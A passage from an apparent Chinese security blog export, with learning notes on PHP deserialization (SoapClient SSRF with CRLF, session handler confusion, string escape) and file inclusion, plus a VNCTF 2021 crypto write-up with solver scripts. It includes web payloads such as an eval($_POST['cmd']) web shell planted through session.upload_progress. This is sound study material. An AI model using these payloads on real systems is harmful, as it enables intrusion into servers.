unserialize","date":"2021-03-23T06:20:24.000Z","path":"2021/03/23/The-learning-of-php-unserialize/","text":"概述当unserialize()的参数可控时, 可以传入一个构造好的序列串控制类内部的变量甚至函数, 如果类内部存在比较危险的函数include() eval()等等, 将会造成严重后果 如何利用当服务端代码中存在某个类的时候, 可以通过unserialize()创建一个该类的对象, 而我们可控的就是类中的属性, 还可以利用一些技巧去绕过一些魔术方法或者是利用一些魔术方法. 通过控制魔术方法和属性达到我们想要的攻击效果. 一般流程 寻找参数可控的unserialize() 寻找可以用于命令执行, 文件包含等等的函数在危险类 找到一个控制链控制危险类中的危险函数 魔术方法1234567891011__wakeup() //执行unserialize()时，先会调用这个函数__sleep() //执行serialize()时，先会调用这个函数__destruct() //对象被销毁时触发__call() //在对象上下文中调用不可访问的方法时触发__callStatic() //在静态上下文中调用不可访问的方法时触发__get() //用于从不可访问的属性读取数据或者不存在这个键都会调用此方法__set() //用于将数据写入不可访问的属性__isset() //在不可访问的属性上调用isset()或empty()触发__unset() //在不可访问的属性上使用unset()时触发__toString() //把类当作字符串使用时触发__invoke() //当尝试将对象调用为函数时触发 需要注意的是, __toString()这个方法触发的方式比较多: echo ($obj) / print($obj)打印时会触发 反序列化对象与字符串连接时 反序列化对象参与格式化字符串时 反序列化对象与字符串进行==比较时（PHP进行==比较的时候会转换参数类型） 反序列化对象参与格式化SQL语句，绑定参数时 反序列化对象在经过php字符串函数，如 strlen()、addslashes()时 在in_array()方法中，第一个参数是反序列化对象，第二个参数的数组中有toString返回的字符串的时候toString会被调用 反序列化的对象作为 class_exists() 的参数的时候 关于绕过的Trick绕过__wake() 版本:php 5&lt; 5.6.25php 7&gt; 7.0.10 利用方法:当序列化的字符串中的属性个数大于类中实际的属性个数时, 就会跳过__wake()函数 绕过正则表达式 加号绕过, 在反序列化的时候, 数字前面的加号会被当成是正号而正则匹配的时候则不会这样识别 比如说O:4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}, 有时候题目会通过正则O\\:\\d来匹配O:4, 这时将序列改成O:+4:\"test\":1:{s:1:\"a\";s:3:\"abc\";}就能绕过该匹配 变量引用利用变量引用使得类中两个变量始终相等 php原生类反序列化SoapClient反序列化利用概述php安装php-soap扩展之后, 可以反序列化原生类SoapClient, 来发送http post请求来实现SSRF通过反序列化SoapClient对象后调用不存在的方法触发__call()方法这个__call()方法会向指定URL发送HTTP POST请求, 因为User-Agent字段可控, 所以可以通过CRLF来构造请求头实现自定义POST DATA 如果要在自己的环境复现则需要更改php.ini中的extension=soap 利用方法举个栗子 1234567&lt;?php $target = \"http://127.0.0.1/test.php\"; $ua = \"kirito-zbds\"; $a = new SoapClient(NULL,array('location'=&gt;$target,'uri'=&gt;'k1rit0','user_agent'=&gt;$ua)); $b = serialize($a); $c = unserialize($b); $c -&gt; tan90_function(); 当SoapClient对象被逆序列化出来并调用一个不存在的tan90_function()方法时.__call()方法会向location也就是http://127.0.0.1/test.php发送一个HTTP POST请求, 而请求头中会有: 12User-Agent: kirito-zbdsSOAPAction: k1rit0#tan90_function() // uri + 被调用的不存在的函数名 可以看到, 请求头中的这些字段会变成可控的, 但这样只能通过内网访问test.php, 并不能任意POST数据. 要想POST数据, 就要用到CRLF了. 什么是CRLFCRLF就是\\r\\n的缩写, HTTP协议中header之间是用一个\\r\\n来分隔的, 而HTTP header和HTTP body之间是用\\r\\n\\r\\n也就是两个\\r\\n来分割的. 如果请求头中的字段可控, 那么可以手动添加\\r\\n用以在请求中添加字段甚至是添加HTTP body用以POST data. 比如在上面的例子中, 我们把$ua改为 1$ua = \"kirito-zbds\\r\\nContent-Type:application-www-form-urlencoded\\r\\nContent-Length:17\\r\\n\\r\\ndata=this_is_data\" 那么HTTP POST的请求头中就会出现这么一串 123456User-Agent: kirito-zbdsContent-Type: application-www-form-urlencodedContent-Length: 17data=this_is_dataSOAPAction: k1rit0#tan90_function() 这样就成功伪造出HTTP POST请求并传输参数了 php-session反序列化又是session, 上次在文件包含也有session, 其实这里的反序列化也要用到那边的知识 概述关于session.upload_progress这个php-session反序列化其实跟session.uplaod_progress有关, 详细的可以看文件包含那部分的笔记这里只简单的说一下, 服务端的php.ini默认配置session.use_strict_mode = 0, 这样用户可以自己设置Cookies: PHPSESSID = xxxxxx, 服务端将会创建一个/tmp/sess_xxxxxx文件 并且, 如果用户向服务端传送文件, 那么服务端将会在/tmp/sess_xxxxxx中写入上传进度, 最重要的是. 如果用户的POST DATA中含有PHP_SESSION_UPLOAD_PROGRESS=xxx, 那么服务端将会在/tmp/sess_xxxxxx中写入 1upload_progress_xxx | 上传进度 关于session.serialize_handler在执行php代码时可以设置这么两个东西 12ini_set('session.serialize_handler','php_serialize');ini_set('session.serialize_handler','php'); 这里设置的是php处理session的方式,php或php_serialize. 默认是php这两个方式的不同就在于, 存取session文件的格式不同.下面从一个例子来详细的看一下这两个方式的区别 123456&lt;?phpini_set('session.serialize_handler', 'php');// ini_set('session.serialize_handler','php_serialize');session_start();$_SESSION['k1rit0'] = $_GET['a'];var_dump($_SESSION); php方式的存取的格式是:键名|serialize_string, 当我传?a=a:2:{s:4:\"name\";s:6:\"kirito\";s:3:\"age\";i:14;}session文件中存的是k1rit0|s:45:\"a:2:{s:4:\"name\";s:6:\"kirito\";s:3:\"age\";i:14;}\"; 而如果用的是php_serialize方式,存取的格式就是serialize_string, session文件中存的便是a:1:{s:6:\"k1rit0\";s:45:\"a:2:{s:4:\"name\";s:6:\"kirito\";s:3:\"age\";i:14;}\";} 利用方法根据上面的两个session存取方法, 如果我们先以php_serialize储存 再按php的方式读取, 就可以反序列化一些恶意的序列. 就拿上面的例子来说, 先以php_serialize储存?a=|a:2:{s:4:\"name\";s:6:\"kirito\";s:3:\"age\";i:14;},注意那个| 这个时候来看看session里是啥 1a:1:{s:6:\"k1rit0\";s:46:\"|a:2:{s:4:\"name\";s:6:\"kirito\";s:3:\"age\";i:14;}\";} 如果这个时候, 按php的方式读取这个session文件, 就会被识别成两部分: |前面的a:1:{s:6:\"k1rit0\";s:46:\" |后面的a:2:{s:4:\"name\";s:6:\"kirito\";s:3:\"age\";i:14;}\";} |后面的前一部分`a:2:{s:4:\"name\";s:6:\"kirito\";s:3:\"age\";i:14;}, 会被识别成一个完整的序列化串 这里有个session_start()的小知识, 如果php代码中存在session_start()而且处理session的方式是php, 那么在执行session_start()时会反序列化session中|后的序列化串, 并赋值给$_SESSION变量 如果php代码中某些类中有__wake()或__destruct(), 并且这两个魔法函数中存在危险的函数, 则可以通过session反序列化控制这些危险函数. 至于如何在session文件中写入恶意序列化串呢? 那就要用到session.upload_progress中的PHP_SESSION_UPLOAD_PROGRESS了, 具体怎么用, 去看文件包含那篇笔记吧 反序列化字符逃逸如果存在对序列化后的字符进行替换, 并且替换后字符长度会变, 则有可能存在字符逃逸 替换后字符变长1234function change($str){ return str_replace(\"o\", \"oo\", $str);} 比如说上面这个函数, 把输入的字符串中的o替换成oo如果有这么个数组array(\"name\" =&gt; \"kirito\",\"level\" =&gt; \"18\");,序列化之后就是a:2:{s:4:\"name\";s:6:\"kirito\";s:5:\"level\";s:2:\"18\";}再用上面的函数处理序列化字符串, 就会变成a:2:{s:4:\"name\";s:6:\"kiritoo\";s:5:\"level\";s:2:\"18\";}, 这里就会出现一个错误s:6:\"kiritoo\", 长度应该为6的字符变成7了 逃逸逃逸, 目的就是逃出双引号, 如果我们的数组是 1234array( \"name\" =&gt; 'kiritooooooooooooooooooooooooo\";s:5:\"level\";s:3:\"999\";}', \"level\" =&gt; '18') 序列化之后就是a:2:{s:4:\"name\";s:55:\"kiritooooooooooooooooooooooooo\";s:5:\"level\";s:3:\"999\";}\";s:5:\"level\";s:2:\"18\";} 这里name里面本身就有双引号, 但是不能实现逃逸, 是因为反序列化时候, 会读取指定长度的字符后下一个字符是否是\"就比如这里的s:55:\"kiritooooooooooooooooooooooooo\";s:5:\"level\";s:3:\"999\";}\",读取55个字符kiritooooooooooooooooooooooooo\";s:5:\"level\";s:3:\"999\";}后, 就剩下结尾的\", 所以中间的\"并不影响反序列化 但如果将序列化之后的字符串进行替换操作, 将会变成s:55:\"kiritoooooooooooooooooooooooooooooooooooooooooooooooooo\";s:5:\"level\";s:3:\"999\";}, 现在再来看看读取55个字符后是啥, 我们发现kiritoooooooooooooooooooooooooooooooooooooooooooooooooo刚好就是55个字符, 而后面刚好就是一个\", 这意味着在反序列化的时候, 后面的;s:5:\"level\";s:3:\"999\";}则会逃逸出去, 被识别成序列化字符串的另一部分.(具体原因就是因为多出的o的长度刚好就是\";s:5:\"level\";s:3:\"999\";})的长度 最后, 我们来看看总的字符串处理完是怎样的 1a:2:{s:4:\"name\";s:55:\"kiritoooooooooooooooooooooooooooooooooooooooooooooooooo\";s:5:\"level\";s:3:\"999\";}\";s:5:\"level\";s:2:\"18\";} 反序列化有个特点, 当判断反序列化结束后, 后面的字符将会自动忽略, 那么这里反序列化就会只处理a:2:{s:4:\"name\";s:55:\"kiritoooooooooooooooooooooooooooooooooooooooooooooooooo\";s:5:\"level\";s:3:\"999\";}后面的\";s:5:\"level\";s:2:\"18\";}会被自动忽略, 这样我们就成功通过控制name, 逃逸并修改了level 将处理后的字符串反序列化的结果: 123array(2) { [\"name\"]=&gt; string(55) \"kiritoooooooooooooooooooooooooooooooooooooooooooooooooo\" [\"level\"]=&gt; string(3) \"999\" } 参考文章 y4爷爷的反序列化总结: https://blog.csdn.net/solitudi/article/details/113588692?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522161638163316780357284910%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&amp;request_id=161638163316780357284910&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_v1~rank_blog_v1-14-113588692.pc_v1_rank_blog_v1&amp;utm_term=show CRLF总结: https://wooyun.js.org/drops/CRLF%20Injection%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8%E4%B8%8E%E5%AE%9E%E4%BE%8B%E5%88%86%E6%9E%90.html","tags":[{"name":"Web","slug":"Web","permalink":"http://tearsjin.github.io/tags/Web/"},{"name":"Unserialize","slug":"Unserialize","permalink":"http://tearsjin.github.io/tags/Unserialize/"}]},{"title":"The learning of php 文件包含","date":"2021-03-21T06:26:07.000Z","path":"2021/03/21/The-learning-of-php-文件包含/","text":"文件包含概述文件包含顾名思义, 通过某些函数来引入一些文件但传入的文件名没有经过合理的验证, 从而操作了预想之外的文件, 就可能导致意外的文件泄漏甚至恶意代码注入。 常见的文件包含函数 include() require() include_once() require_once() highlight_file() show_source() readfile() file_get_contents() fopen() file() PHP伪协议通常情况下有文件包含函数还不够, 需要搭配伪协议才能干更多的事情 协议 PHP版本 alow_url_fopen allow_url_include 用法示例 file:// &gt;=5.2 off/on off/on file://D:/soft/phpStudy/WWW/flag.txt php://filter &gt;=5.2 off/on off/on php://filter/read=convert.base64-encode/resource=./index.php php://input &gt;=5.2 off/on on php://input [post data]: &lt;?php phpinfo() ?&gt; zip:// &gt;=5.2 off/on off/on zip://D:/soft/phpStudy/WWW/file.zip%23flag.txt compress.bzip2:// &gt;=5.2 off/on off/on compress.bzip2://D:/soft/phpStudy/WWW/file.bz2compress.bzip2://./file.bz2 compress.zlib:// &gt;=5.2 off/on off/on 同上 data:// &gt;=5.2 on on data://text/plain,&lt;?php phpinfo()?&gt;data://text/plain;base64,PD9waHAgcGhwaW5mbygpPz4= 包含日志文件Web服务器一般会将用户的访问记录保存在日志文件当中. 如果存在文件包含的函数, 而且知道日志文件的路径, 可以构造请求把PHP代码写进日志文件中并引入执行 寻找日志文件日志文件的目录一般会被修改, 可以寻找httpd.conf,nginx,conf或者根据phpinfo()中的信息来得知日志文件目录 Apache: Windows: &lt;Apache安装目录&gt;\\logs\\access.log | error.log Linux: /usr/local/apache/logs/access_log | error_log Nginx: /var/log/nginx 包含session.upload_progress PHP版本: 5.4+ 在php5.4以上添加了一个新的功能 session.upload_progress, 这个功能在客户端上传文件的时候会创建一个session文件, 默认路径应该是/tmp/tmp, 这个文件里存储的上传文件的进度. 不过, 要利用这个session.upload_progress, 还要依靠另外一个php.ini的默认选项session.use_strict_mode = 0, 当这个值为0的时候, 用户是可以自己定义Session ID的, 比如在Cookies中设置PHPSESSID = k1rit0, php将在服务器上创建一个tmp/tmp/sess_k1rit0, 并且自动初始化, 也就是会在里面写入 1session.upload_progress.prefix + session.upload_progress.name session.upload_progress.prefix是服务端设置的, 默认为upload_progress_session.upload_progress.name是用户POST的data: PHP_SESSION_UPLOAD_PROGRESS, 比如POST PHP_SESSION_UPLOAD_PROGRESS= &lt;?php eval($_POST[\"cmd\"]);?&gt;那么用户在上传文件的时候, 就会生成这么一个session文件 1upload_progress_&lt;?php eval($_POST[\"cmd\"]);?&gt; | // 后面是上传进度 很显然这个文件如果被文件包含函数包含, 则可以执行一系列的命令但是这个session文件将在文件上传完成之后自动删除.这里就需要利用条件竞争了, 不停的上传同样的文件, 使得session一直存在.","tags":[{"name":"Web","slug":"Web","permalink":"http://tearsjin.github.io/tags/Web/"},{"name":"文件包含","slug":"文件包含","permalink":"http://tearsjin.github.io/tags/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/"}]},{"title":"writeup for 2021VNCTF Crypto","date":"2021-03-14T11:51:27.000Z","path":"2021/03/14/writeup-for-2021VNCTF/","text":"这次比赛听说是签到难度, 就做了一下, 结果也没能ak (说简单都是骗人的…)嗯… 会做的题也没什么收获, 硬要说的话, whitegive的第一层需要通过运算把已知的条件合在一起或者消去一些不可能求出的参数, 这个一直都是密码分析的基础吧, 来看看题吧 0x00 wihtegiveproblem123456789101112131415161718192021222324252627282930313233343536from Crypto.Util.number import *from secret import urlfrom gmpy2 import *m = bytes_to_long(url)p = getPrime(512)q = getPrime(512)n = p * qd = getPrime(256)e = inverse(d,(p-1)*(q-1))c = pow(m,e,n)print(n)print(c)m = ep = getPrime(512)q = getPrime(512)n = p * p * qe = 0x10001d = inverse(e,lcm(p,lcm(p-1,q-1)))c = pow(m,e,n)hint = pow(d,e,n)print(n)print(c)print(hint)'''97814568264814384858194701955408461509880555772006698372422205341758322175891474378211599333051180365254844248340812534463000531890490435018379585036704801177155418066770861143206836558793774360498040810255823235715535487716966004194143204900564413879660115112965484824906920141847149888933004740523449213441861433117883636756846741136991930467817966389132430161525555721508581595005276740637546945145019997918755611429251549910005326287991856084650628145461081604344680988980407690210720073741565463149752405833474680260016336529404087791555793394709605710676529248146233711779010523020052891553050895882042043132611246903000089073759886267722667196003041462505274526737638837808213476294697746018085346623497511017543801377442390781101585650581984057653018703031659844145960721073451379508212905335383758157379301019575213158532070229897587088955814288202279949391608732448294591675986989254272257059551622461096394217684402667140362275595245430242117193793913872208576714597860532581116390903216389172132085635891741189355461016795362341416848534340615825023292174042406128959952508462840095293368043281511747192551431448088755251878915582522463097721381421883702408853564036431155676272901680250701398946525803160765527940151587567521509500006089852079864042238196362897144754722623523621230744820970423076092319608853809407595863195726851921082224085255808985329769890887863865121647796115540376158135632760785321953364738008064130705467326745546629505023549047992509562623348749056757848144371814157305011884825502144329268299851210747788785744509676701442642497798353940704045062680685297430840370664093043099033424646382070232242765761123110381200239132310785932203252095093993313010883982078216697297202940152563278231011836966627537170460186597134847633828107444548759805274516431300662852153808962421740187067058018192457264083227110866080267684557127718769967184710395811547902947248700889674967381917907905535103547918375731341071557144999864774198881339085314424766509424492349867615604684''' 1234567891011121314151617181920212223242526# Wow, you got here!# This is the last task, trust me!from Crypto.Util.number import *from secret import flag,paddingfrom gmpy2 import *m = bytes_to_long(flag)e = 7 p = getPrime(512)q = getPrime(512)n = p * qc1 = pow(m,e,n)c2 = pow(m+padding,e,n)print(n)print(c1)print(c2)'''143224951702807798608353389056046982493788310072914995404719898237226283884553121669729599925829562704800197375580487019006702401282671268969358774635337351738915083955659230582177495821699251999928502338923489031347921151957398310960671307216790020399224115377846788378990638367296298663795893865325304226511747971736575756405981407884108520168436125195883759681905797344209513741031295706378225472179679789113284198085292041435224541423031389590132208115584909516143143068493670684781907978850569227054030288567340952885222900553098805723215574937983620562167837775933861333476938929419281319459860877127378622637619209695919437085323423940852135308337887271742988391422139555924185234849146079306139570263602339983687993333013333937719071267190971983543492940032646907167417161479697805991443259327402389097539126399994414628326218438416138199892253597375493026563369334352434282120293396846427418323600336867792587721214''' 好家伙, 连Crypto都开始套娃了, 一共三层RSA, 做了前两层才能知道第三层 第一层 利用gcd()分解n e : 65537 c: 密文 hint: 这题不算难, 仔细算一下就能知道这个hint有什么用了首先看一下d = inverse(e,lcm(p,lcm(p-1,q-1))), 都已经是素数了, 公倍数肯定是 那么我们就有把hint的式子和这个式子都改写成:联立一下就有:取个gcd(e**e * hint - 1,n), 就可以有p了, 分解n就好做了, 这一层还是挺有意思的 第二层 Boneh_Durfee attack这一层的私钥, 而, 满足使用Boneh_Durfee attack的条件, 直接扔到脚本里跑就能跑出来了有了直接解密即可 第三层 Coppersmith’s Short-pad Attack第二层出来一个网站https://dawn-whisper.lanzous.com/iCAv0lod7yj-password:gzjq', 以及密码 打开后还是一道RSA 如题, e够小, 直接上脚本就行 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from gmpy2 import *from Crypto.Util.number import long_to_bytes# 第一层e = 65537h = 788785744509676701442642497798353940704045062680685297430840370664093043099033424646382070232242765761123110381200239132310785932203252095093993313010883982078216697297202940152563278231011836966627537170460186597134847633828107444548759805274516431300662852153808962421740187067058018192457264083227110866080267684557127718769967184710395811547902947248700889674967381917907905535103547918375731341071557144999864774198881339085314424766509424492349867615604684n = 1246903000089073759886267722667196003041462505274526737638837808213476294697746018085346623497511017543801377442390781101585650581984057653018703031659844145960721073451379508212905335383758157379301019575213158532070229897587088955814288202279949391608732448294591675986989254272257059551622461096394217684402667140362275595245430242117193793913872208576714597860532581116390903216389172132085635891741189355461016795362341416848534340615825023292174042406128959c = 952508462840095293368043281511747192551431448088755251878915582522463097721381421883702408853564036431155676272901680250701398946525803160765527940151587567521509500006089852079864042238196362897144754722623523621230744820970423076092319608853809407595863195726851921082224085255808985329769890887863865121647796115540376158135632760785321953364738008064130705467326745546629505023549047992509562623348749056757848144371814157305011884825502144329268299851210747ee = pow(e, e)p = gcd(ee * h - 1, n)q = n // p ** 2phi = (p - 1) * p * (q - 1)d = invert(e,phi)e = pow(c, d, n)print(e)# 第二层# Boneh_Durfee attack出的结果# 脚本在https://github.com/mimoo/RSA-and-LLL-attacks/blob/master/boneh_durfee.saged = 103079922798932082066165266087442072203677117380612800709240732626110126828541n = 97814568264814384858194701955408461509880555772006698372422205341758322175891474378211599333051180365254844248340812534463000531890490435018379585036704801177155418066770861143206836558793774360498040810255823235715535487716966004194143204900564413879660115112965484824906920141847149888933004740523449213441assert pow(pow(3,e,n),d,n) == 3c = 86143311788363675684674113699193046781796638913243016152555572150858159500527674063754694514501999791875561142925154991000532628799185608465062814546108160434468098898040769021072007374156546314975240583347468026001633652940408779155579339470960571067652924814623371177901052302005289155305089588204204313261print(long_to_bytes(pow(c,d,n)))# 第三层def short_pad_attack(c1, c2, e, n): PRxy.&lt;x,y&gt; = PolynomialRing(Zmod(n)) PRx.&lt;xn&gt; = PolynomialRing(Zmod(n)) PRZZ.&lt;xz,yz&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+y)^e - c2 q1 = g1.change_ring(PRZZ) q2 = g2.change_ring(PRZZ) h = q2.resultant(q1) h = h.univariate_polynomial() h = h.change_ring(PRx).subs(y=xn) h = h.monic() kbits = n.nbits()//(2*e*e) diff = h.small_roots(X=2^kbits, beta=0.4)[0] return diffdef related_message_attack(c1, c2, diff, e, n): PRx.&lt;x&gt; = PolynomialRing(Zmod(n)) g1 = x^e - c1 g2 = (x+diff)^e - c2 def gcd(g1, g2): while g2: g1, g2 = g2, g1 % g2 return g1.monic() return -gcd(g1, g2)[0]n = 143224951702807798608353389056046982493788310072914995404719898237226283884553121669729599925829562704800197375580487019006702401282671268969358774635337351738915083955659230582177495821699251999928502338923489031347921151957398310960671307216790020399224115377846788378990638367296298663795893865325304226511e = 7c1 = 74797173657575640598140788410852016843612519588375968190579734420951374103129570637822547217967978911328419808529204143522454142303138959013220811558490951614314306849367068478190797885056922705403028856734095288522290055309880572321557493798362056216783777593386133347693892941928131945986087712737862263761c2 = 9209695919437085323423940852135308337887271742988391422139555924185234849146079306139570263602339983687993333013333937719071267190971983543492940032646907167417161479697805991443259327402389097539126399994414628326218438416138199892253597375493026563369334352434282120293396846427418323600336867792587721214diff = short_pad_attack(c1, c2, e, n)m1 = related_message_attack(c1, c2, diff, e, n)long_to_bytes(m1) # VNCTF{H4ppyNeWy34r!2021_V&amp;N_figHt1ng!} 0x01 strange functionproblem1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495from Crypto.Util.number import *from hashlib import sha256from secret import flagimport socketserverimport signalimport stringimport randomimport osMENU = br'''[+] 1.function[+] 2.check_answer[+] 3.exit'''class Task(socketserver.BaseRequestHandler): # 为了缩短篇幅, 这部分没有特别意义的函数就省略了 def proof_of_work(self): random.seed(os.urandom(8)) proof = ''.join([random.choice(string.ascii_letters+string.digits) for _ in range(20)]) _hexdigest = sha256(proof.encode()).hexdigest() self.send(f\"[+] sha256(XXXX+{proof[4:]}) == {_hexdigest}\".encode()) x = self.recv(prompt=b'[+] Plz tell me XXXX: ') if len(x) != 4 or sha256(x+proof[4:].encode()).hexdigest() != _hexdigest: return False return True def function(self, x): res = 0 for i in range(self.lenth): numerator = ord(self.token[i]) denominator = x - self.data[i] try: tmp = numerator / denominator except Exception as e: self.send(b'[+] Error!') return res += tmp return res def handle(self): signal.alarm(1000) if not self.proof_of_work(): return self.send(b'[+] Welcome!') self.send(b'[+] Can you find the flag through the calculating?') self.score = 0 self.token = ''.join(random.sample(string.ascii_letters + string.digits, 16)) self.lenth = len(self.token) self.data = [] for i in range(self.lenth): self.data.append(getRandomInteger(32)) self.send(str(self.data).encode()) while True: self.send(MENU, newline=False) choice = self.recv() if(choice == b'1'): self.send(b\"[+] Plz give me your x: \") now = int(self.recv().strip().decode()) now = self.function(now) self.send((\"[+] let me show you the answer: \"+str(now)).encode()) elif(choice == b'2'): guess = self.recv().strip().decode() if(guess == self.token): self.score += 1 self.send(b\"[+] You win!\") self.send((\"[!] Now your score: \" + str(self.score)).encode()) self.token = ''.join([random.choice(string.digits + string.ascii_letters) for i in range((self.score+1)*16)]) self.lenth = len(self.token) self.data = [] for i in range(self.lenth): self.data.append(getRandomInteger(32)) self.send(str(self.data).encode()) if(self.score &gt;= 5): self.send(flag.encode()) else: self.send(b'[+] What do you want to say???') self.send(b'[!] Go away!') break else: break self.request.close()if __name__ == \"__main__\": HOST, PORT = '0.0.0.0', 10002 server = ForkedServer((HOST, PORT), Task) server.allow_reuse_address = True server.serve_forever() 分析先理一理这题在干嘛, 要我们干嘛前面常规的工作量证明就不说了 每次访问服务端的时候, 会从abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789挑出16位作为token 然后将token中的每一位的ascii码都乘一个不同的随机的数(范围在), 作为data然后发给客户端客户端可以输入一个数让服务端计算: 并返回给客户端 解题的目标就是通过服务端返回的,(可以重复输入不同的获得不同的猜出五轮的(每一轮的位数都会增加 因为这里的范围比较大, 所以每一个都相差比较远, 当的时候, 会特别大所以事实上每次输入的时候, 有把每次的四舍五入之后就是了所以每一轮把都发送一次, 就能得到了 exp123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051from pwn import *from hashlib import sha256import reprintable = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'def proof(END, SHA): for i in printable: for j in printable: for k in printable: for l in printable: start = i + j + k + l ensha = sha256((start+END).encode()).hexdigest() if ensha == SHA: print(start) return startcon = remote('node3.buuoj.cn',29406)resp = con.recvuntil(': ').decode()END = re.findall('XXXX\\+(.*)\\)',resp)[0]SHA = re.findall('== (.*)',resp)[0]con.send(proof(END,SHA).encode())resp = con.recvuntil('[-] ').decode()for _ in range(5): token = [] array = re.findall(r'\\d+', resp) data = [] for i in array: if len(i) &gt; 1: data.append(int(i)) for i in data: con.sendline('1') resp = con.recvuntil('[-] ').decode() con.sendline(str(i + 1)) resp = con.recvuntil('[-] ').decode() token.append(round(float(re.findall(r'let me show you the answer: (.*)', resp)[0]))) print(token) presend = '' for i in token: presend += chr(i) con.sendline('2') resp = con.recvuntil('[-] ').decode() con.sendline(presend) resp = con.recvuntil('[-] ').decode() print(resp)# flag{66a00c10-773f-4375-8a8e-444f0337bd31} 0x02 strange_function_revengeproblem跟上一题的区别不大, 就不贴上来了 分析跟第一题的区别就在于随机数的大小变小了, 这样会导致每个的差距不会太大, 再发送, 返回的四舍五入就不一定是了, 这里的解决办法就是对返回的进行一次修正后再四舍五入 因为是从abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789取的, 这些字符的ascii都是连在一起的, 平均数是86, 每次发送的时候, 把除了的其他都当作86, 这样就可以计算出:这样就可以有!跟strange_function一样发送数据就行了不过这个方法不太稳定, 并不能保证每次都准确的修正, 放一首好运来多跑几次吧(大概跑了七八次吧…. exp1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859from pwn import *from hashlib import sha256import reprintable = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'A = 86def proof(END, SHA): for i in printable: for j in printable: for k in printable: for l in printable: start = i + j + k + l ensha = sha256((start+END).encode()).hexdigest() if ensha == SHA: print(start) return startcon = remote('node3.buuoj.cn',27609)resp = con.recvuntil(': ').decode()END = re.findall('XXXX\\+(.*)\\)',resp)[0]SHA = re.findall('== (.*)',resp)[0]con.send(proof(END,SHA).encode())resp = con.recvuntil('[-] ').decode()for _ in range(5): token = [] data = [] offset = [] array = re.findall(r'\\d+', resp) for i in array: if len(i) &gt; 1: data.append(int(i)) for i in data: psend = i + 1 sum = 0 for j in data: if i != j: sum += A / (psend - j) offset.append(sum) for i in data: con.sendline('1') resp = con.recvuntil('[-] ').decode() con.sendline(str(i + 1)) resp = con.recvuntil('[-] ').decode() token.append(round(float(re.findall(r'let me show you the answer: (.*)', resp)[0])-offset[data.index(i)])) print(token) presend = '' for i in token: presend += chr(i) con.sendline('2') resp = con.recvuntil('[-] ').decode() con.sendline(presend) resp = con.recvuntil('[-] ').decode() print(resp)# flag{dfd7a22a-0ac7-4b7a-9dad-9d321fa2fcfa} 0x03 fatcor 对着某个paper写了一下午的algorithm, 没做出来, tcltcltcl….. 等wp出来再总结一下 结果一个师傅教我了hh problem1234567891011121314151617181920212223242526272829303132from Crypto.Util.number import *from gmpy2 import *from secret import flagdef get_public_key(d): while 1: p, q = getPrime(512), getPrime(512) N, phi, not_phi = p * q, (p - 1) * (q - 1), (p + 1) * (q + 1) try: e = inverse(d, not_phi) assert gcd(e, phi) == 1 break except: pass return (N, e)def encrypt(pubkey, m): N, e = pubkey c = pow(m, e, N) return cm = bytes_to_long(flag)d = getPrime(300)pubkeys = [get_public_key(d), get_public_key(d)]cs = encrypt(pubkeys[0], m), encrypt(pubkeys[1], m)print(pubkeys)print(cs)'''[(115483338707853323510117244601663937653032657454816581880428779391136584508645415322441921678179684904267659942318581245589538093236558206867210468172871004098796706517288570963560499418427771831765342801956281881820593084352360716457591198748797415842971188690055630073433785996545367137242661591939632740177, 57942961120648999071495995119939754708884253716257622598699627649519120883383654560602196191747110519111036450217116739928381611061803307053632035548944075112790103258912149703053932492832060534126356062378027983000713091223894604748395826345780826674822582205573649323340945351657354960324397873669889767611), (53622548101803784449246949981043962044702821559359430270342163843702543781580388956841660273746825211912789196955019345268896290156568895362182295889379787233440464948232717888315385094207004043907898658611926470834448875571292174245716821120409044389816082878077188546182422805778560826667364235348059795229, 37629174280947918845570975617525141920002123382327456934545962737176558640617579710289304146119507880547361939594011152968663070025066085778798378563965349218834887746411017240322083056673687330052590220772859205859051875687741541958997904176801239206348298021023694604932588913541173039972303193792987583003)](51861394323132582263685584977796608641129485967610029542263453128833142621927008505594685713111162217651119546991411861320042282788909858323941435593508384080858965324662410947546608051702238057613339996124961723578887443100478753831786550701578678090466528863014222331341645240511640398819027209200809466160, 53200507591144017820710284362261363695745231005527161900426580605551005076410241969689161754211964469126847594337121140420040532547631617290907291418063708630323838133357597795892690304405706577096504918510233628396424543417886828387510407109281423448827267022542075484645277275676556239547911837897827866040)''' 分析抄了那么久的paper居然是用格子做的! 感谢d33b4t0师傅指点才弄出这题 这题给出了一个300-bit的, 再根据这个生成了两套公钥 关系式为记, 把式子化一下就有自己做的时候只用的其中的一个式子造二维格子, 结果死活都规约不出来(也不知道为啥, 以后能造三维就试试造三维吧. 用这两个式子造出一个三维格子(至于为啥有个, 当然是为了调整一下范数! 向量的长度也是合适的(得靠的位数来判断 通过规约这个格子, 有了, 就能得出 剩下的就是已知求了, 不过这里的有点不太一样注意一下就ok了 exp12345678910111213141516171819202122from Crypto.Util.number import long_to_bytes as l2b ,isPrimen1 = 115483338707853323510117244601663937653032657454816581880428779391136584508645415322441921678179684904267659942318581245589538093236558206867210468172871004098796706517288570963560499418427771831765342801956281881820593084352360716457591198748797415842971188690055630073433785996545367137242661591939632740177n2 = 53622548101803784449246949981043962044702821559359430270342163843702543781580388956841660273746825211912789196955019345268896290156568895362182295889379787233440464948232717888315385094207004043907898658611926470834448875571292174245716821120409044389816082878077188546182422805778560826667364235348059795229e1 = 